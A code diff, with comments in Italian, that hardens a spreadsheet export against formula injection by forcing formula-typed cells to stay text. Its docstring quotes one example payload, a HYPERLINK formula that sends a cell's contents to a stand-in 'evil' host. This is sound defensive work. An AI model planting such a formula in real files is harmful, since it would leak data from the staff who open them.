@@ -85,7 +85,19 @@ def scrivi_foglio_dati(
     ws.append(list(colonne))
     for riga in righe:
         ws.append([_valore_cella(riga.get(colonna)) for colonna in colonne])
+        _mai_formule(ws[ws.max_row])
     return len(righe)
+
+
+def _mai_formule(celle) -> None:
+    """openpyxl salva come FORMULA ogni stringa che inizia con `=`: un lead
+    con nome `=HYPERLINK("https://evil/?"&B2,"Apri")` diventerebbe una
+    formula viva nel file aperto dallo staff (CSV/formula injection). I dati
+    esportati sono sempre dati: la cella resta testo, con il valore intatto
+    (il giro export -> import non cambia)."""
+    for cella in celle:
+        if cella.data_type == "f":
+            cella.data_type = "s"
 
 
 def build_filename(risorsa_slug: str, *, con_margine: bool = False) -> str:
